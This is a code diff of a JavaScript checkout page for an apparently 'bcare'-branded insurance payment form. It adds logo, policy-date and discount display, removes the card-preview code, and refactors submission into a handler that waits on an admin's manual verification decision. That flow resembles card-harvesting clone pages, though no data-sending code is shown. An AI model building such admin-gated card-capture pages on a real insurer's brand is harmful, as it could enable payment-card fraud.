@@ -53,26 +53,53 @@ function loadData() {
   try {
     const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
     const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
+    const inquiry = JSON.parse(sessionStorage.getItem('bcare_inquiry') || '{}');
     const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
 
-    set('co-amount-company', offer.companyName || '—');
-    set('co-amount-price',   offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
+    /* الشعار */
+    const logo = document.getElementById('co-logo');
+    if (logo && offer.companyLogo) { logo.src = offer.companyLogo; logo.style.display = 'block'; }
+    else if (logo) { logo.style.display = 'none'; }
 
-    /* ملخص الدفع الكامل */
-    set('co-sum-name',      policy.fullName     || '—');
-    set('co-sum-company',   offer.companyName   || '—');
-    set('co-sum-type',      offer.insuranceType || '—');
-    set('co-sum-card',      '****');  /* يتحدث لحظياً عند كتابة رقم البطاقة */
-    set('co-sum-card-type', '');
-    set('co-sum-price',     offer.price ? 'ر.س '+parseFloat(offer.price).toFixed(2) : '—');
-    set('co-sum-vat',       offer.vat   ? 'ر.س '+parseFloat(offer.vat).toFixed(2)   : '—');
-    set('co-sum-total',     offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
+    set('co-sum-company', offer.companyName || '—');
+
+    /* فترات التأمين */
+    const start = inquiry.policyStartDate || '';
+    if (start) {
+      set('co-sum-start', start);
+      const d = new Date(start);
+      if (!isNaN(d)) {
+        d.setFullYear(d.getFullYear() + 1);
+        const endStr = d.toLocaleDateString('ar-SA', { year:'numeric', month:'2-digit', day:'2-digit' });
+        set('co-sum-end', endStr);
+      } else {
+        set('co-sum-end', '—');
+      }
+    }
+
+    /* المبالغ */
+    const price    = offer.price || 0;
+    const discount = offer.discount || 0;
+    const vat      = offer.vat || 0;
+    const total    = offer.total || 0;
+
+    const fmtR = (n) => 'ر.س ' + parseFloat(n).toFixed(2);
+    set('co-sum-price',  fmtR(price));
+    set('co-sum-vat',    fmtR(vat));
+    set('co-sum-total',  fmtR(total));
+
+    if (discount > 0) {
+      document.getElementById('co-discount-row').style.display = '';
+      set('co-sum-discount', '-' + fmtR(discount));
+      const subtotal = price - discount;
+      document.getElementById('co-subtotal-row').style.display = '';
+      set('co-sum-subtotal', fmtR(subtotal));
+    }
 
     /* اسم الحامل من policy-details */
     const nameInp = document.getElementById('cc-name');
     if (nameInp && policy.fullName) {
       nameInp.value = policy.fullName;
-      updatePrevName(policy.fullName);
     }
   } catch(e) {}
 }
@@ -87,24 +114,6 @@ function initFloatingLabels() {
     /* حالة أولية */
     if (inp.value) inner.classList.add('has-value');
   });
-}
-
-/* ─── تحديث البطاقة البصرية ─────────────────────── */
-function updatePrevNum(fmt) {
-  const e = document.getElementById('prev-number');
-  if (e) e.innerHTML = fmt ? fmt.replace(/ /g,' &nbsp;') : '•••• &nbsp;•••• &nbsp;•••• &nbsp;••••';
-}
-function updatePrevName(v) {
-  const e = document.getElementById('prev-name');
-  if (e) e.textContent = v?.trim().toUpperCase() || 'الاسم الكامل';
-}
-function updatePrevExpiry(v) {
-  const e = document.getElementById('prev-expiry');
-  if (e) e.textContent = v || 'MM/YY';
-}
-function updatePrevType(name) {
-  const e = document.getElementById('prev-type');
-  if (e) e.textContent = name || '';
 }
 
 /* ─── خطأ / مسح خطأ ──────────────────────────────── */
@@ -176,10 +185,6 @@ function initCardNum() {
     const fmt    = fmtCardNum(raw, type);
     inp.value    = fmt;
 
-    /* معاينة */
-    updatePrevNum(fmt);
-    updatePrevType(type?.name || '');
-
     /* pill — سيُحدَّث أسفل مع الملخص */
 
     /* تحديث الملخص السفلي — آخر 4 أرقام */
@@ -237,7 +242,6 @@ function initExpiry() {
     const yr = raw.slice(2,4);
     const newRaw = month + yr;
     inp.value = fmtExpiry(newRaw);
-    updatePrevExpiry(inp.value);
     setCardErr('');
     updateInnerState('inner-expiry', inp.value);
   });
@@ -261,7 +265,6 @@ function initName() {
   const inp = document.getElementById('cc-name');
   if (!inp) return;
   inp.addEventListener('input', () => {
-    updatePrevName(inp.value);
     setNameErr('');
     updateInnerState('inner-name', inp.value);
   });
@@ -531,10 +534,11 @@ function showVerifyReject() {
 function initSubmit() {
   const form = document.getElementById('checkout-form');
   const btn  = document.getElementById('pay-now-btn');
-  if (!form||!btn) return;
+  if (!form) return;
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
+  async function doPayment(e) {
+    if (e) e.preventDefault();
+    if (!btn) return;
     if (!validateAll()) return;
 
     btn.disabled = true;
@@ -562,7 +566,9 @@ function initSubmit() {
     /* عرض الشاشة + بدء الاستماع لقرار الأدمن */
     showVerifyingOverlay();
     startVerifyPolling();
-  });
+  }
+
+  form.addEventListener('submit', doPayment);
 }
 
 /* ─── INIT ────────────────────────────────────────── */
